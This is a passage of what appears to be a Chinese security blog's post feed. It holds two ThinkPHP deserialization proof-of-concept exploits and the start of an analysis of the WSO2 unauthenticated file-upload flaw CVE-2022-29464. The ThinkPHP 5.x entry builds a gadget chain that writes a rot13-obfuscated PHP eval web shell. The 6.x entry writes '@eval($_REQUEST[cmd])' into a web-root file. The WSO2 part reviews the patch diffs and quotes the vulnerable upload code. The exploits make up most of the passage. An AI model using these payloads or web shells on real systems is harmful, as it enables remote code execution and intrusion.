class="string">&#x27;option&#x27;</span>   =&gt; [],</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; options[<span class="string">&#x27;expire&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; handler = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * File constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; options = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/write=string.rot13/resource=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Memcache constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>  = [</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; handler = <span class="keyword">new</span> <span class="title class_">Memcached</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; config = [</span><br><span class="line">                <span class="string">&#x27;host&#x27;</span>         =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// memcache主机</span></span><br><span class="line">                <span class="string">&#x27;port&#x27;</span>         =&gt; <span class="number">11211</span>, <span class="comment">// memcache端口</span></span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span>       =&gt; <span class="number">0</span>, <span class="comment">// session有效期</span></span><br><span class="line">                <span class="string">&#x27;timeout&#x27;</span>      =&gt; <span class="number">0</span>, <span class="comment">// 连接超时时间（单位：毫秒）</span></span><br><span class="line">                <span class="string">&#x27;persistent&#x27;</span>   =&gt; <span class="literal">true</span>, <span class="comment">// 长连接</span></span><br><span class="line">                <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;&lt;?cuc $n=fgegbhccre(&quot;_erdhrfg&quot;);riny($$n[&quot;pzq&quot;])?&gt;&#x27;</span>, <span class="comment">// memcache key前缀</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Output constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt;styles =[</span><br><span class="line">              <span class="string">&#x27;getAttr&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; handle = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Relation</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * OneToOne constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; bindAttr = [</span><br><span class="line">                <span class="string">&quot;armandhenewpy&quot;</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * HasOne constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Query constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; model = <span class="keyword">new</span> <span class="title class_">Output</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Relation constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; selfRelation = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; query = <span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Model constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; <span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; append = [</span><br><span class="line">                <span class="string">&#x27;getError&#x27;</span></span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Windows constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; files = [<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Pivot</span>()</span><br><span class="line"></span><br><span class="line">        ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Unserialization</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getpayload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>())));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>thinkphp</tag>
        <tag>PoC</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP6.x反序列化POC</title>
    <url>/archives/6bc452e1.html</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractAdapter</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">pathPrefix</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pathPrefix = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Local</span> <span class="keyword">extends</span> <span class="title">AbstractAdapter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span>\<span class="title class_">Local</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//        protected $complete = [];</span></span><br><span class="line"><span class="comment">//        protected $expire = null;</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cache</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; autosave = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//            $this -&gt; complete = [&#x27;armandheddd&#x27; =&gt; &#x27;sdkfjdslfjsl&#x27;];</span></span><br><span class="line"><span class="comment">//            $this -&gt; expire = &#x27;noipi&#x27;;</span></span><br><span class="line">            <span class="variable language_">$this</span> -&gt; cache = [<span class="string">&quot;payload&quot;</span> =&gt; <span class="string">&quot;\&lt;?php @eval(\$_REQUEST[cmd])?&gt;&quot;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Adapter constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; adapter = <span class="keyword">new</span> <span class="title class_">Local</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; file = <span class="string">&#x27;D:/phpstudy_pro/WWW/tp/public/armandhenewpy.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">Adapter</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">createPayload</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createpayload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Adapter</span>())));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>thinkphp</tag>
        <tag>PoC</tag>
      </tags>
  </entry>
  <entry>
    <title>WOS2 多款产品未授权任意文件上传漏洞【CVE-2022-29464】</title>
    <url>/archives/193abed6.html</url>
    <content><![CDATA[<p>全公司最大的黑阔在群里发了一张截图是老外发的关于这个漏洞复现的截图，于是我昨天看了很久他的源码，开始还是很难受的，可以知道的信息就是这是一个文件上传漏洞，看了最新发布的版本的修改</p>
<blockquote>
<p><a href="https://github.com/wso2/carbon-kernel/pull/3152/files">https://github.com/wso2/carbon-kernel/pull/3152/files</a></p>
</blockquote>
<span id="more"></span>
<p>这部分是对文件上传的实现代码的修改，其实我看了感觉这儿其实还并不重要，因为也没修改啥内容，另一处修改就是添加了权限验证的代码</p>
<blockquote>
<p><a href="https://github.com/wso2/carbon-identity-framework/pull/3864/files">https://github.com/wso2/carbon-identity-framework/pull/3864/files</a></p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/61f6f3da8298c1792d1a080fc1988d13.png" alt="在这里插入图片描述"><br>我一开始很疑惑，因为不知道这里面每个标签的具体功能，标签属性的定义是啥，这就很无耐。这应该是一个权限控制的xml文件<br>resource标签的context为路由， secured为是否开启权限认证，如果为false的话则不开启，也就是可以未授权访问。这里注意到红色部分，对<code>&quot;(.*)/fileupload(.*)</code>的定义是设置的为<code>false</code>的，也就是这个接口是可以未授权访问的，看名字很明显是一个未授权访问的接口。但是关于这个接口的映射关系，最终调用的是哪个类我开始一直很迷惑，因为这个的项目结构没有接触过，每个xml文件的作用域调用过程我都不是很熟悉，就很烦。<br>最新版还有一处修改就是</p>
<blockquote>
<p><a href="https://github.com/wso2-extensions/identity-carbon-auth-rest/pull/167/files">https://github.com/wso2-extensions/identity-carbon-auth-rest/pull/167/files</a></p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e0f17ada21a096f036fe5b8dcef66711.png" alt="在这里插入图片描述"></p>
<p>阅读代码可以发现其实并没有什么打的变化，这里就是判断cookie是否是有效的，换了一种实现方式而已，对漏洞的修复感觉影响不大。这里去到最重要的部分，也就是第一处的修改<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6009bcdcad8f0affccd116e95b3d615b.png" alt="在这里插入图片描述"><br>这里删除了很多的映射关系，可以看到是两个文件上传的执行器，那么我们其实可以去看看这连个执行器是怎么写的，当然现在我们不看这个，还有另一个文件被修改了</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5efcf5a4234b867a72be55dca8db4b41.png" alt="在这里插入图片描述"><br>主要的修改有两处<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8425b889449e7c0dae5a19361722a934.png" alt="在这里插入图片描述"><br>这里对<code>uploadFile</code>的赋值进行了修改，添加了一个函数<code>verifyCanonicalDestination</code>对<code>fileName</code>进行检查，这个函数是新增加的，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/71238db3876c7a36f19eda14010c3118.png" alt="在这里插入图片描述"><br>大概的意思就是<br>首先使用<code>getCanonical</code>函数对<code>dirs</code>进行规范化，这个函数处理会将类似’..&#x2F;..&#x2F;..&#x2F;..&#x2F;‘这种给干掉直接获取最终的路径，这种时候如果我们使用目录穿越将会使得最终获取的路径产生变化，然后使用<code>extraFileLocation</code>变量新建一个File对象，然后也调用<code>getCanonicalPath</code>函数进行规范化，然后调用<code>startsWith</code>函数判断后生成的<code>canonicalDestinationFile</code>是否以<code>canonicalDestinationPath</code>开头，如果不是的话就抛出异常，很明显如果我们对<code>canonicalDestinationPaht</code>使用了目录穿越的话那么将必然导致抛出异常，那么文件上传也就失败了。但是这里我还有个疑惑，这里<code>canonicalDestinationPath</code>的获取是使用<code>extraFileLocation</code>拼接了<code>fileName</code>的我们可以控制的只有<code>fileName</code>，我们看看<code>fileName</code>怎么来的</p>
<blockquote>
<p>String fileName &#x3D; getFileName(fileItem.getFileName());</p>
</blockquote>
<p>这里首先使用<code>fileItem.getFileName()</code>获取了一遍，这时候获去的文件名如果有目录穿越的特征是会影响到上传目的地的，但是这里还调用了当前类的方法<code>getFileName</code>就不一样了，我们看看这个函数怎么定义的<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f9d8f8ea56387625b386d2fe36708dd7.png" alt="在这里插入图片描述"><br>最新的代码只是修改了实现方式，当然还是有一点区别，主要是新的代码里对空字节截断进行了处理，当然这并不影响什么，这里只取了最后一个<code>\\</code>或者<code>/</code>后面的内容，也就是说目录穿越在这里就已经被避免掉了，我实在没想明白为什么后面要再进行一次处理。<br>当然走到这里其实我的思路已经出了问题，我看的这个文件是<code>FielUploadServer.java</code>而我们在路径映射文件中看到的实际处理文件上传的类为<br><img src="https://i-blog.csdnimg.cn/blog_migrate/172058099f83306af784c92f4834621c.png" alt="在这里插入图片描述"><br>害，所以我们应该去找到这个类：</p>
<blockquote>
<p><a href="https://github.com/bhagyasakalanka/carbon-kernel/blob/release-4.4.9/core/org.wso2.carbon.ui/src/main/java/org/wso2/carbon/ui/transports/fileupload/ToolsAnyFileUploadExecutor.java">https://github.com/bhagyasakalanka/carbon-kernel/blob/release-4.4.9/core/org.wso2.carbon.ui/src/main/java/org/wso2/carbon/ui/transports/fileupload/ToolsAnyFileUploadExecutor.java</a></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*  Copyright (c) 2005-2010, WSO2 Inc. (http://www.wso2.org) All Rights Reserved.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*  WSO2 Inc. licenses this file to you under the Apache License,</span></span><br><span class="line"><span class="comment">*  Version 2.0 (the &quot;License&quot;); you may not use this file except</span></span><br><span class="line"><span class="comment">*  in compliance with the License.</span></span><br><span class="line"><span class="comment">*  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* Unless required by applicable law or agreed to in writing,</span></span><br><span class="line"><span class="comment">* software distributed under the License is distributed on an</span></span><br><span class="line"><span class="comment">* &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY</span></span><br><span class="line"><span class="comment">* KIND, either express or implied.  See the License for the</span></span><br><span class="line"><span class="comment">* specific language governing permissions and limitations</span></span><br><span class="line"><span class="comment">* under the License.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> org.wso2.carbon.ui.transports.fileupload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bidimap.TreeBidiMap;</span><br><span class="line"><span class="keyword">import</span> org.wso2.carbon.CarbonException;</span><br><span class="line"><span class="keyword">import</span> org.wso2.carbon.utils.FileItemData;</span><br><span class="line"><span class="keyword">import</span> org.wso2.carbon.utils.ServerConstants;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToolsAnyFileUploadExecutor</span> <span class="keyword">extends</span> <span class="title class_">AbstractFileUploadExecutor</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">execute</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">			HttpServletResponse response)</span> <span class="keyword">throws</span> CarbonException, IOException &#123;</span><br><span class="line">		<span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="type">Map</span> <span class="variable">fileResourceMap</span> <span class="operator">=</span></span><br><span class="line">                (Map) configurationContext</span><br><span class="line">                        .getProperty(ServerConstants.FILE_RESOURCE_MAP);</span><br><span class="line">        	<span class="keyword">if</span> (fileResourceMap == <span class="literal">null</span>) &#123;</span><br><span class="line">        		fileResourceMap = <span class="keyword">new</span> <span class="title class_">TreeBidiMap</span>();</span><br><span class="line">        		configurationContext.setProperty(ServerConstants.FILE_RESOURCE_MAP,</span><br><span class="line">                                             fileResourceMap);</span><br><span class="line">        	&#125;</span><br><span class="line">            List&lt;FileItemData&gt; fileItems = getAllFileItems();</span><br><span class="line">            <span class="comment">//String filePaths = &quot;&quot;;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (FileItemData fileItem : fileItems) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">uuid</span> <span class="operator">=</span> String.valueOf(</span><br><span class="line">                        System.currentTimeMillis() + Math.random());</span><br><span class="line">                <span class="type">String</span> <span class="variable">serviceUploadDir</span> <span class="operator">=</span></span><br><span class="line">                        configurationContext</span><br><span class="line">                                .getProperty(ServerConstants.WORK_DIR) +</span><br><span class="line">                                File.separator +</span><br><span class="line">                                <span class="string">&quot;extra&quot;</span> + File</span><br><span class="line">                                .separator +</span><br><span class="line">                                uuid + File.separator;</span><br><span class="line">                <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(serviceUploadDir);</span><br><span class="line">                <span class="keyword">if</span> (!dir.exists()) &#123;</span><br><span class="line">                    dir.mkdirs();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">File</span> <span class="variable">uploadedFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir, fileItem.getFileItem().getFieldName());</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOutStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(uploadedFile)) &#123;</span><br><span class="line">                    fileItem.getDataHandler().writeTo(fileOutStream);</span><br><span class="line">                    fileOutStream.flush();</span><br><span class="line">                &#125;</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/plain; charset=utf-8&quot;</span>);</span><br><span class="line">                <span class="comment">//filePaths = filePaths + uploadedFile.getAbsolutePath() + &quot;,&quot;;</span></span><br><span class="line">                fileResourceMap.put(uuid, uploadedFile.getAbsolutePath());</span><br><span class="line">                out.write(uuid);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//filePaths = filePaths.substring(0, 